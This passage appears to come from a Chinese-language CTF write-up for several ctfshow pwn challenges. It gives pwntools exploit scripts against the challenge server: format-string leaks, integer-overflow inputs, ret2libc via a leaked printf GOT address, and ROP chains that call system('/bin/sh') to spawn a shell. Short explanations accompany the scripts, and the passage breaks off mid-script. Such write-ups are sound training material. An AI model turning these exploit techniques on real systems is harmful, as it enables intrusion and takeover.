</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28189</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="o">+</span><span class="mi">12</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="s1">&#39;%{}$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">aim</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="n">aim</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意所有部分都是字节对象！</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">%</span><span class="err">{}</span><span class="n">p</span><span class="o">`</span><span class="w"> </span><span class="err">中的</span><span class="w"> </span><span class="o">`</span><span class="err">{}</span><span class="o">`</span><span class="w"> </span><span class="err">会被替换为当前的</span><span class="w"> </span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="w"> </span><span class="err">值，例如</span><span class="w"> </span><span class="o">`%</span><span class="mi">1</span><span class="n">p</span><span class="o">`</span><span class="err">、</span><span class="o">`%</span><span class="mi">2</span><span class="n">p</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="k">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="err">：去掉返回数据中的</span><span class="w"> </span><span class="mi">0</span><span class="n">x</span><span class="w"> </span><span class="err">前缀</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">unhex</span><span class="p">()</span><span class="err">将十六进制转换成字节</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">drop</span><span class="o">=</span><span class="no">True</span><span class="p">)</span><span class="err">：接收服务器返回的数据，直到遇到换行符</span><span class="w"> </span><span class="err">\</span><span class="n">n</span><span class="err">，并丢弃换行符。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">aim</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="err">逆向</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn101">pwn101
</h2><p><img src="/p/ctfshow-pwn/image-20250304194410992.png"
	width="1413"
	height="758"
	srcset="/p/ctfshow-pwn/image-20250304194410992_hu_8326fe6a8d9c876b.png 480w, /p/ctfshow-pwn/image-20250304194410992_hu_2b7a82578d0788ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>v4和v5初始化，输入两个整数，把它转换成无符号整数，并赋值给v4和v5，如果v4=0x80000000,v5=0x7FFFFFFF,给flag，但是要求输入十进制，快捷键’H‘转换数据类型</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28275</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;-2147483648 2147483647&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter two intergers:&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interative</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn102">pwn102
</h2><p><img src="/p/ctfshow-pwn/image-20250304195247199.png"
	width="714"
	height="424"
	srcset="/p/ctfshow-pwn/image-20250304195247199_hu_8133f68c12bfabe0.png 480w, /p/ctfshow-pwn/image-20250304195247199_hu_cb9583694edc0048.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<p>要求输入无符号整型，输入4294967295就行</p>
<h2 id="pwn105">pwn105
</h2><p>整形溢出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">408</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="o">*</span><span class="n">p_argc</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">400</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">p_argc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">logo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;[+] Check your permissions:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400</span><span class="n">u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ctfshow</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;wtf&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char *__cdecl ctfshow(char *s)
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  char dest[8]; // [esp+7h] [ebp-11h] BYREF
</span></span><span class="line"><span class="cl">  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  v3 = strlen(s);
</span></span><span class="line"><span class="cl">  if ( v3 &lt;= 3u || v3 &gt; 8u )
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    puts(&#34;Authentication failed!&#34;);
</span></span><span class="line"><span class="cl">    exit(-1);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  printf(&#34;Authentication successful, Hello %s&#34;, s);
</span></span><span class="line"><span class="cl">  return strcpy(dest, s);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>unsigned __int8 v3 要求无符号8位整数</p>
<p>strcpy(dest, s) 将会复制8个字符加上一个空字符 \0，总共9个字符，</p>
<p>这里就是检查字符串长度，思考：如何bypass这个if条件</p>
<p>dest的栈长度为0x11,缓冲区buf长度0x400，unsigned __int8 v3从0到255字节就截断，就是说256字节是0，257字节表示1，258字节表示3，可以利用这个条件构造payload，使payload长度足够长</p>
<h2 id="pwn107">pwn107
</h2><p>流程：先想如何绕过整数限制，泄露printf地址，计算libc基址，计算system和/bin/sh的地址，调用system(&quot;/bin/sh&quot;)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28167</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>  <span class="c1"># 使用系统默认的 libc 文件路径</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;read?&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;read?&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>思考：为什么是printf = u32(io.recv(4))，print(hex(printf))</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data = io.recv(4)  # 返回 b&#39;\x7f\x45\x4c\x46&#39;
</span></span><span class="line"><span class="cl">printf = u32(data)  # 解析为整数 0x464c457f
</span></span><span class="line"><span class="cl">print(hex(printf))  # 打印 0x464c457f
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn41">pwn41
</h2><p>system(&quot;/bin/sh&quot;)是直接指定了系统默认的shell程序路径来执行命令,system(&ldquo;sh&rdquo;)则依赖系统的环境变量$PATH来寻找sh可执行文件</p>
<p><img src="/p/ctfshow-pwn/image-20250308124615875.png"
	width="652"
	height="155"
	srcset="/p/ctfshow-pwn/image-20250308124615875_hu_30443bb5aa99f369.png 480w, /p/ctfshow-pwn/image-20250308124615875_hu_dcf1fd6702bef6cd.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28166</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn(2)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x080487BA</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn42">pwn42
</h2><p>和前面一样，仅仅是32位和64位的区别</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ROPgadget --binary ./pwn
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28139</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;pwn(3)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span><span class="mh">0x400872</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span><span class="mh">0x400843</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40053e</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn43">pwn43
</h2><p>没有‘bin/sh’需要自己构造，先调用gets()函数，p32(gets),将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，拍2</p>
<p>使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址</p>
<p><img src="/p/ctfshow-pwn/image-20250308180148608.png"
	width="964"
	height="843"
	srcset="/p/ctfshow-pwn/image-20250308180148608_hu_7ca263b8db3a42db.png 480w, /p/ctfshow-pwn/image-20250308180148608_hu_5a4fa8ca8824e128.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="274px"
	
></p>
<p>通过覆盖返回地址，将gets函数的地址作为返回地址覆盖到栈上，使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址，执行system(buf2)指向的字符串，p32(gets)将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，pop_ebx用于将栈上的值弹出并存储到寄存器ebx中，buf2是一个指向存储输入数据的缓冲区的指针，p32(system)将system函数的地址作为返回地址覆盖到栈上，&lsquo;aaaa&rsquo;这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28141</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span>   <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span>  <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x0804B060</span>
